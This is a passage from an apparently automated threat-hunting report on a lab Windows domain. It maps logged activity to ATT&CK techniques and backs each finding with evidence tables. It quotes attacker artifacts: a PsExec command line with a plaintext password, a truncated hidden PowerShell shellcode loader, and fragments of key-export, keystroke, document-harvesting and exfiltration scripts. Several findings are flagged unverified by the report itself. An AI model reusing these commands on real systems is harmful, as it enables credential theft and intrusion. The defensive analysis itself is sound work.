| 2 | 2020-05-02 02:58:42.401Z | scranton.dmevals.local | windows.sysmon | process.parent.executable | C:\Windows\System32\cmd.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpgxY85 | q-674dceb703 | ok |
| 3 | 2020-05-02 02:58:42.855Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\windows\system32\sdclt.exe"  | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpgxI_4 | q-674dceb703 | ok |

### F26 · suspicious / medium · T1552.001 · Credential-bearing files staged and archived on scranton and nashua (passwordsDB, Draft.Zip, OfficeSupplies.7z, working.zip)

Evidence status: **verified**

In the same pbeesly PowerShell session on scranton.dmevals.local, Sysinternals accesschk.exe created C:\Program Files\SysinternalsSuite\passwordsDB at 03:04:35Z, and powershell.exe created archive files C:\Users\pbeesly\AppData\Roaming\Draft.Zip (02:56:18Z) and C:\Users\pbeesly\AppData\Roaming\OfficeSupplies.7z (03:08:35Z). The operator then moved laterally to nashua.dmevals.local via PsExec64.exe with an explicit plaintext password (-u dmevals\pbeesly -p Fl0nk3rt0n!T0by), where powershell.exe and C:\Windows\Temp\Rar.exe created C:\Users\pbeesly\AppData\Roaming\working.zip and C:\Users\pbeesly\Desktop\working.zip (03:16Z). The archives were then wiped with sdelete64.exe on both hosts. The collection of a file literally named passwordsDB plus password-protected archives is consistent with harvesting credentials found in files, though the archive contents themselves are not visible in the telemetry.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:35.069Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Program Files\SysinternalsSuite\passwordsDB | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCRb2e | q-cd36079b25 | ok |
| 2 | 2020-05-02 03:04:35.069Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\Program Files\SysinternalsSuite\accesschk.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCRb2e | q-cd36079b25 | ok |
| 3 | 2020-05-02 03:08:35.270Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Users\pbeesly\AppData\Roaming\OfficeSupplies.7z | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkx5Y3M | q-bed96ec3db | ok |
| 4 | 2020-05-02 03:16:00.353Z | nashua.dmevals.local | windows.sysmon | win.TargetFilename | C:\Users\pbeesly\AppData\Roaming\working.zip | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkmtdLv | q-bed96ec3db | ok |
| 5 | 2020-05-02 03:11:18.784Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItku2r93 | q-fc079ebe18 | ok |

### F40 · suspicious / medium · T1556.007 · No hybrid-identity backdoor; service installs are PsExec/Java, not identity connectors

Evidence status: **verified**

The 7045 service installs in windows.other are PSEXESVC (%SystemRoot%\PSEXESVC.exe, installed four times on nashua.dmevals.local by pbeesly between 03:11:39 and 03:15:03) and a Java(TM) Virtual Machine Support Service (C:\Windows\System32\javamtsup.exe) on scranton.dmevals.local at 03:04:15. The PSEXESVC installs are the remote-execution channel used by the attacker's PsExec64.exe with the plaintext pbeesly password, not a modification of a hybrid identity/ADFS/PTA component; no 5136 directory changes were found.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:11:39.000Z | nashua.dmevals.local | windows.other | win.ServiceName | PSEXESVC | .ds-logs-windows.other-default-2026.10.17-000001 / AaFHo31uOFchItyZYWV3 | q-817cc9703e | ok |
| 2 | 2020-05-02 03:04:15.000Z | scranton.dmevals.local | windows.other | process.executable | C:\Windows\System32\javamtsup.exe | .ds-logs-windows.other-default-2026.10.17-000001 / AaFHo31uOFchItyZYWXW | q-817cc9703e | ok |

### F51 · suspicious / medium · T1558 · Compromised host scranton: pbeesly-context PowerShell intrusion chain (credential-adjacent collection, not ticket theft)

Evidence status: **NOT verified (4/6 evidence items)** — excluded from the verdict

On scranton.dmevals.local the pbeesly account ran a malicious PowerShell chain from 02:56Z to 03:08Z: a hidden, execution-policy-bypass PowerShell (PID 2976) launched from control.exe that decoded shellcode from a bitmap (monkey.png) and IEX'd it; registry Folder\shell\open\command hijack; archive of user documents (*pass*, *login*, *admin*, *.pst) into Draft.Zip; SysinternalsSuite deployment with sdelete64 anti-forensics; Invoke-Discovery, Invoke-Persistence, Get-PrivateKeys (exporting cert:\LocalMachine certs to .pfx with password 'saribas'), screen capture, Get-Keystrokes, Get-Clipboard, and Invoke-Exfil compressing Downloads to OfficeSupplies.7z with password 'lolol' and a WebDAV credential. This is credential-adjacent collection (private keys, keystrokes, clipboard) but no Kerberos ticket material was accessed: the only LSASS handle from this PowerShell (PID 2976, 0x1fffff at 03:05:16Z) has a call trace ending in an UNKNOWN module, and no ticket/kirbi/Rubeus/Mimikatz strings appear in any script block. Reported as suspicious for the intrusion, not as T1558 ticket theft.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:58:44.325Z | scranton.dmevals.local | windows.sysmon | process.command_line | "PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbee… | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpgwo_a | q-d63772dce1 | ok |
| 2 | 2020-05-02 02:56:17.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHpH1uOFchItwHqJZm | q-31b073892d | ok |
| 3 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Get-PrivateKeys {     $mypwd = ConvertTo-SecureString -String "saribas" -Force -AsPlainText     $CertPaths = Get-ChildItem -Path cert:\LocalMachine -Re… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHpH1uOFchItwCkSzI | q-5e5b165795 | FAILED: claimed value differs from the stored value |
| 4 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-Exfil {      if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershe… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHo31uOFchItz5hds0 | q-518f56bf76 | FAILED: claimed value differs from the stored value |
| 5 | 2020-05-02 03:06:59.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | Get-Keystrokes;Start-Sleep -Seconds 15;View-Job -JobName "Keystrokes" | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHpH1uOFchItwAjopf | q-518f56bf76 | ok |
| 6 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQr3J | q-ce533ee685 | ok |

### F52 · suspicious / medium · T1558 · Lateral movement to nashua via WinRM as pbeesly with archive staging; no ticket theft

Evidence status: **NOT verified (3/4 evidence items)** — excluded from the verdict

On nashua.dmevals.local, wsmprovhost.exe (PID 7720, WinRM remote shell) was started as pbeesly at 03:09:23Z, immediately followed by PowerShell process/user enumeration and a full-access LSASS handle (0x1f3fff) at 03:09:29Z whose call trace is entirely .NET/PowerShell management assemblies. At 03:15:59Z the same session enumerated user documents (*pass*, *login*, *admin*, *.pst) and at 03:16:19Z ran Rar.exe with password 'fGzq5yKw' to stage working.zip. This is consistent with the scranton intrusion spreading laterally, but no Kerberos ticket material (kirbi, TGS dump, Rubeus/Mimikatz) was observed, so it is reported as suspicious intrusion activity rather than T1558 ticket theft.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:09:23.885Z | nashua.dmevals.local | windows.sysmon | process.command_line | C:\windows\system32\wsmprovhost.exe -Embedding | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkw468x | q-eef7410169 | ok |
| 2 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkw4a_B | q-58f70e1de3 | ok |
| 3 | 2020-05-02 03:16:19.000Z | nashua.dmevals.local | windows.powershell | win.ScriptBlockText | .\Rar.exe a -hpfGzq5yKw "$env:USERPROFILE\Desktop\working.zip" "$env:APPDATA\working.zip" | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHpH1uOFchItwDlSQT | q-167ca03071 | ok |
| 4 | 2020-05-02 03:15:59.000Z | nashua.dmevals.local | windows.powershell | win.ScriptBlockText | $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHpH1uOFchItwCk1OJ | q-167ca03071 | FAILED: claimed value differs from the stored value |

### F54 · suspicious / medium · T1606.001 · No web cookie theft/forging; instead malicious .scr execution and PsExec with plaintext password to run python.exe on NASHUA

Evidence status: **verified**

No cookie files were written or forged: the only cookie-related file creation in the window is a benign INetCookies path under the LocalService WARP JIT package on scranton, and the only .json creations are WMI ConfigurationStatus files on newyork. However, the same host/user shows clearly malicious credential-access-adjacent activity that the cookie check surfaced indirectly. On scranton.dmevals.local at 2020-05-02T02:55:56Z user pbeesly launched C:\ProgramData\victim\â€®cod.3aka3.scr ("...scr" /S, parent explorer.exe, unsigned, no company/description), then at 03:02:04Z ran sdelete64.exe against that file from powershell.exe. From 03:11:18Z to 03:14:42Z pbeesly ran PsExec64.exe four times with the password supplied in cleartext on the command line (\\NASHUA -u dmevals\pbeesly -p <password> -i 2 C:\Windows\Temp\python.exe). On nashua.dmevals.local PSEXESVC.exe (installed by services.exe) spawned C:\Windows\Temp\python.exe as pbeesly, which then made repeated outbound TCP connections to 192.168.0.4:8443. This is credential misuse and lateral movement, not web-cookie forging, so T1606.001 itself is not observed; the activity is reported as suspicious because it is attacker tooling in the same session.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:55:56.157Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\ProgramData\victim\â€®cod.3aka3.scr" /S | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpk1QgV | q-12c29585e9 | ok |
| 2 | 2020-05-02 02:55:56.157Z | scranton.dmevals.local | windows.sysmon | process.parent.executable | C:\Windows\explorer.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpk1QgV | q-12c29585e9 | ok |
| 3 | 2020-05-02 03:11:18.784Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItku2r93 | q-39cecdcb93 | ok |
| 4 | 2020-05-02 03:11:40.213Z | nashua.dmevals.local | windows.sysmon | process.parent.executable | C:\Windows\PSEXESVC.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItku2b9g | q-39cecdcb93 | ok |
| 5 | 2020-05-02 03:15:05.142Z | nashua.dmevals.local | windows.sysmon | destination.ip | 192.168.0.4 | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItknvJ-S | q-8689e30ab6 | ok |
| 6 | 2020-05-02 03:15:05.142Z | nashua.dmevals.local | windows.sysmon | destination.port | 8443 | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItknvJ-S | q-8689e30ab6 | ok |
| 7 | 2020-05-02 03:02:04.324Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Program Files\SysinternalsSuite\sdelete64.exe" /accepteula C:\programdata\victim\???cod.3aka3.scr | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpHV4S3 | q-39cecdcb93 | ok |

### F05 · benign / medium · T1003.002 · No SAM hive dumping observed

Evidence status: **verified**

No 4663/4656 access to SAM or SECURITY hive files, no reg save / SAM export command lines (the only 4688 command lines matching reg/save/sam were dsregcmd.exe and sc.exe start pushtoinstall registration), and no hive copy/rename of SAM in sysmon file-create-time events. The 4663 hits on ControlSet001\Control\Lsa are covered under T1003.004. No evidence of SAM database theft.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:55:56.000Z | scranton.dmevals.local | windows.security | win.ObjectName | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwxYBM3 | q-e7c1d57f4c | ok |

### F06 · benign / medium · T1003.003 · No NTDS.dit theft observed

Evidence status: **verified**

No sysmon file-create-time events referencing ntds, and no 4688 command lines containing ntds, vssadmin or ntdsutil. No NTDS extraction activity in the observed window.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:16:15.000Z | newyork.dmevals.local | windows.security | win.ObjectServer | DS | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwhC87m | q-c708b0f072 | ok |

### F07 · benign / medium · T1003.005 · No cached domain credential (NL$/Cache) access observed

Evidence status: **verified**

No 4663 or 4656 events referencing Cache or NL$ registry objects. Cached-credential harvesting was not observed; the credential access seen on scranton targeted LSASS memory and the Lsa key instead.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.000Z | scranton.dmevals.local | windows.security | win.ObjectName | \Device\HarddiskVolume2\Windows\System32\lsass.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwqOo54 | q-3d8dcefc55 | ok |

### F04 · benign / medium · T1003.006 · Single 4662 DS-Replication-Get-Changes access by NEWYORK$ machine account — benign replication

Evidence status: **verified**

Only one 4662 event in the whole dataset carries replication GUIDs: on newyork.dmevals.local at 2020-05-01T23:16:15Z, subject NEWYORK$ (S-1-5-18, logon 0x167eda) accessed object %{11487126-e2dc-4f51-acb1-1b0df0573bb5} with Properties {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes) and {19195a5b-6da0-11d0-afd3-00c04fd930c9}. The subject is the domain-joined machine account of the DC itself, not a user or attacker-controlled principal, and there is no accompanying drsuapi/lsadump/DCSync activity in sysmon, powershell or windows.other. Consistent with normal AD replication, not a DCSync attack.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:16:15.000Z | newyork.dmevals.local | windows.security | win.Properties | %%7688  		{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}  	{19195a5b-6da0-11d0-afd3-00c04fd930c9}   | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwhC87m | q-a08440984f | ok |
| 2 | 2020-05-02 03:16:15.000Z | newyork.dmevals.local | windows.security | win.SubjectUserName | NEWYORK$ | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwhC87m | q-a08440984f | ok |
| 3 | 2020-05-02 03:16:15.000Z | newyork.dmevals.local | windows.security | win.AccessMask | 0x100 | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwhC87m | q-c708b0f072 | ok |

### F08 · benign / high · T1040 · netsh trace capture on scranton.dmevals.local is Azure Network Watcher agent telemetry, not adversary sniffing

Evidence status: **verified**

The only command-line hits for capture tooling were two netsh.exe invocations on scranton.dmevals.local (2020-05-01T23:19:17 and 23:19:24 local / 2020-05-02T03:19:17 and 03:19:24 UTC). The first runs 'netsh.exe trace start capture=yes traceFile="C:\windows\TEMP\E7116ECA-DFE6-43C7-8FA8-8D3AC5AA8726\B91E06C5-1C7C-4830-9A76-74FA211560A7.etl"' and the second 'netsh.exe trace stop'. In windows.security both events have process.parent.executable = C:\Packages\Plugins\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\1.4.1421.1\NetworkWatcherAgent\NetworkWatcherAgent.exe, i.e. the Azure Network Watcher VM extension performing a short (7 second) ETL packet capture into the agent's own TEMP GUID directory. In sysmon the same two netsh commands run as NT AUTHORITY\SYSTEM and are immediately followed by Azure guest-agent logman.exe trace creation into C:\WindowsAzure\Logs (WaAppAgent.etl, RuntimeEvents.etl), confirming the Azure agent context. No pcap/npcap/wpcap driver image loads (C049 zero hits), no pktmon/dumpcap/windump/rawcap/Wireshark/tcpdump process creation anywhere in sysmon, and no PowerShell capture script blocks (C050 zero hits).

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:19:17.000Z | scranton.dmevals.local | windows.security | process.command_line | C:\windows\system32\netsh.exe trace start capture=yes traceFile="C:\windows\TEMP\E7116ECA-DFE6-43C7-8FA8-8D3AC5AA8726\B91E06C5-1C7C-4830-9A76-74FA211560A7.etl" | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItsU5KNV | q-b7b088105e | ok |
| 2 | 2020-05-02 03:19:17.000Z | scranton.dmevals.local | windows.security | process.parent.executable | C:\Packages\Plugins\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\1.4.1421.1\NetworkWatcherAgent\NetworkWatcherAgent.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItsU5KNV | q-b7b088105e | ok |
| 3 | 2020-05-02 03:19:24.000Z | scranton.dmevals.local | windows.security | process.command_line | C:\windows\system32\netsh.exe trace stop | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItsS3MUJ | q-b7b088105e | ok |
| 4 | 2020-05-02 03:19:17.154Z | scranton.dmevals.local | windows.sysmon | process.command_line | C:\windows\system32\netsh.exe trace start capture=yes traceFile="C:\windows\TEMP\E7116ECA-DFE6-43C7-8FA8-8D3AC5AA8726\B91E06C5-1C7C-4830-9A76-74FA211560A7.etl" | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkYcTxy | q-fcf5a9a4a8 | ok |
| 5 | 2020-05-02 03:19:29.878Z | scranton.dmevals.local | windows.sysmon | process.command_line | "logman.exe" create trace GAEvents -max 50 -f bincirc -o C:\WindowsAzure\Logs\WaAppAgent.etl -p "{3000b92b-ca8b-4269-90ea-c4185ee09e92}" | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpo7P8B | q-fcf5a9a4a8 | ok |

### F09 · benign / medium · T1040 · javamtsup service on scranton.dmevals.local is a SysinternalsSuite artifact, not a packet-capture driver

Evidence status: **verified**

The 7045 service-install stack contained one non-standard name, 'Java(TM) Virtual Machine Support Service' with ImagePath C:\Windows\System32\javamtsup.exe, installed on scranton.dmevals.local at 2020-05-01T23:04:15 local by account pbeesly (auto start, LocalSystem). The binary was not a capture driver: sysmon file-create events show it was extracted by powershell.exe from C:\Users\pbeesly\Downloads\SysinternalsSuite.zip into C:\Users\pbeesly\Downloads\SysinternalsSuite\javamtsup.exe at 2020-05-02T03:00:32, alongside 311 other SysinternalsSuite files (psping.exe, PsInfo64.exe, accesschk.exe, sdelete64.exe, PORTMON.HLP, etc.), and PowerShell 4104 records show pbeesly running Expand-Archive on SysinternalsSuite.zip, moving it to C:\Program Files\SysinternalsSuite, and invoking sdelete64.exe and accesschk.exe. When the service started (2020-05-02T03:19:14) it ran as NT AUTHORITY\SYSTEM from services.exe with no arguments and no network-capture behaviour. The remaining 7045 installs were PSEXESVC on nashua.dmevals.local (4x, demand start) and the standard per-user Windows services; no npcap/pcap/wpcap driver service was installed and no pcap image was ever loaded.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:15.000Z | scranton.dmevals.local | windows.other | win.ServiceName | Java(TM) Virtual Machine Support Service | .ds-logs-windows.other-default-2026.10.17-000001 / AaFHo31uOFchItyZYWXW | q-88a3382650 | ok |
| 2 | 2020-05-02 03:04:15.000Z | scranton.dmevals.local | windows.other | win.ImagePath | C:\Windows\System32\javamtsup.exe | .ds-logs-windows.other-default-2026.10.17-000001 / AaFHo31uOFchItyZYWXW | q-88a3382650 | ok |
| 3 | 2020-05-02 03:00:32.751Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Users\pbeesly\Downloads\SysinternalsSuite\javamtsup.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpMcdEH | q-ce373ffe97 | ok |
| 4 | 2020-05-02 03:00:25.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | Expand-Archive -LiteralPath "$env:USERPROFILE\Downloads\SysinternalsSuite.zip" -DestinationPath "$env:USERPROFILE\Downloads\" | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHpH1uOFchItwHp5Zy | q-848203875c | ok |
| 5 | 2020-05-02 03:19:14.118Z | scranton.dmevals.local | windows.sysmon | process.command_line | C:\Windows\System32\javamtsup.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchIttyFQcI | q-ef3f39dc69 | ok |

### F10 · benign / medium · T1040 · No network sniffing observed in the Zeek window

Evidence status: **verified**

The zeek dataset (2020-04-30T00:06:38Z..00:45:00Z, observers bobs.bigwheel.local and simplerockbuild.simplerock.lan) does not overlap any Windows dataset, so it was hunted on its own. Its 613 conn records are dominated by ssl (378), dns (39), krb_tcp (25), dce_rpc (20) and gssapi/smb combinations, with destination ports 8443 (376), 445 (45), 53 (37), 389 (30), 88 (25), 135 (14), 80 (12), 5985 (8) — a normal AD/file-share/web mix. The only anomalies are 12 'weird' records, 2 notices (SSL::Invalid_Server_Cert self-signed certificate to 192.168.0.5:443 and 192.168.0.4:8443) and a single conn from 10.0.1.4 to 192.168.0.5:1234. None of these show a host in promiscuous/ARP-spoofing or capture-tool posture, and sniffing is passive so it is not directly logged; no evidence of T1040 in this window.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-04-30 00:15:18.392Z | simplerockbuild.simplerock.lan | zeek | zeek.note | SSL::Invalid_Server_Cert | .ds-logs-zeek-default-2026.10.17-000001 / AaFHpH1uOFchItylrovu | q-75a395735e | ok |
| 2 | 2020-04-30 00:08:02.361Z | simplerockbuild.simplerock.lan | zeek | destination.port | 1234 | .ds-logs-zeek-default-2026.10.17-000001 / AaFHpH1uOFchItylr4ug | q-75a395735e | ok |

### F12 · benign / medium · T1056.001 · No keylogger artifacts found; screen/clipboard capture is the observed input-capture method

Evidence status: **verified**

Searches for keylogging indicators returned nothing: no 4688 process creation with keylog/hook/GetAsyncKeyState command lines, no 4104 script blocks containing GetAsyncKeyState/keylog/SetWindowsHookEx, and no windows.other messages referencing keylog/GetAsyncKeyState/SetWindowsHookEx. The only service installs (7045) were PSEXESVC (4) and Java(TM) Virtual Machine Support Service (1), neither a keylogger. Registry writes (event 13/14) were dominated by W32Time, DeliveryOptimization, UserAssist and ContentDeliveryManager values with no keylogger persistence keys. Input capture on this host was performed via GUI screenshot/clipboard collection (reported under T1056.002), not a keystroke logger.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:19:09.000Z | scranton.dmevals.local | windows.other | message | Credential Guard configuration: 0x0, 0 | .ds-logs-windows.other-default-2026.10.17-000001 / AaFHo31uOFchItyZYWX1 | q-4c1a53b96a | ok |

### F13 · benign / medium · T1056.003 · No web portal capture observed

Evidence status: **verified**

No IIS/web-shell activity was found: no file creations under \inetpub or .aspx/.asp files, no w3wp/appcmd/iisreset process creations, no 4663 object access to inetpub/aspx paths, and no PowerShell or windows.other records referencing inetpub/w3wp/IIS. Zeek HTTP traffic in its separate (non-overlapping) window consisted only of /webdav paths (OfficeSupplies.7z, python.exe) with no login/portal POSTs, so no credential-capturing web portal was identified.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:19:20.000Z | scranton.dmevals.local | windows.other | message | The system failed to register pointer (PTR) resource records (RRs) for network adapter  with settings:               Adapter Name : {3F54D943-1568-43BC-9FDA-67D… | .ds-logs-windows.other-default-2026.10.17-000001 / AaFHo31uOFchItyZYWWO | q-4c1a53b96a | ok |

### F16 · benign / high · T1110.001 · No password guessing: zero 4625 failed logons in the dataset

Evidence status: **verified**

Checks C087/C088/C089 returned no hits: there are no event.code 4625 events in windows.security for any host, user or logon type in the 2020-05-02 02:55-03:28 window. All 297 4624 logons are successful and dominated by machine accounts (NEWYORK$ 123, SYSTEM 60, SCRANTON$ 37, NASHUA$ 25) plus pbeesly (30), with no burst of failures against a single account. No guessing activity is observable.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:11:18.000Z | scranton.dmevals.local | windows.security | win.TargetUserName | pbeesly | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwjFEcw | q-10d9eaab35 | ok |
| 2 | 2020-05-02 03:20:46.000Z | scranton.dmevals.local | windows.security | win.IpAddress | 172.18.39.2 | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItsO1YsM | q-10d9eaab35 | ok |

### F18 · benign / high · T1110.003 · No password spraying: no 4625/4771 failures and no single password tried across many accounts

Evidence status: **verified**

Checks C095/C096/C098 returned no hits (no 4625, no 4771). The 15 explicit-credential logons (4648) are 9 for pbeesly plus DWM-1/DWM-2/UMFD-0/UMFD-1/UMFD-2/SCRANTON$ system artifacts; the pbeesly 4648s are the PsExec64 -u dmevals\pbeesly -p ... runs from scranton to NASHUA (10.0.1.6) and the matching PSEXESVC.exe logons on nashua. That is reuse of one already-known credential against a single account, not spraying one password across many accounts.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:11:40.000Z | nashua.dmevals.local | windows.security | process.executable | C:\Windows\PSEXESVC.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwjE0ff | q-10d9eaab35 | ok |
| 2 | 2020-05-02 03:11:18.000Z | scranton.dmevals.local | windows.security | win.TargetServerName | NASHUA | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwjFEcw | q-10d9eaab35 | ok |
| 3 | 2020-05-02 03:11:40.213Z | nashua.dmevals.local | windows.sysmon | process.executable | C:\Windows\Temp\python.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItku2b9g | q-56ac5587de | ok |

### F19 · benign / high · T1110.004 · No credential stuffing: no failed logons and no external source IPs attempting authentication

Evidence status: **verified**

Checks C099/C100/C101 returned no hits. All 297 successful 4624 logons originate from internal addresses only (::1, 10.0.1.4, 10.0.1.6, 10.0.0.4, 10.0.1.10, 10.0.1.5, 172.18.39.2, fe80:: link-local) with logon types 3/5/2/10/0; there is no list of distinct usernames tried against a service and no failed authentication to indicate stuffed credential lists.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:20:46.000Z | scranton.dmevals.local | windows.security | win.TargetUserName | pbeesly | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItsO1YsM | q-10d9eaab35 | ok |
| 2 | 2020-05-02 03:20:46.000Z | scranton.dmevals.local | windows.security | win.IpAddress | 172.18.39.2 | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItsO1YsM | q-10d9eaab35 | ok |

### F20 · benign / medium · T1111 · No MFA/smartcard interception tooling found; LSASS access on scranton/nashua is native Windows and PowerShell/.NET behaviour

Evidence status: **verified**

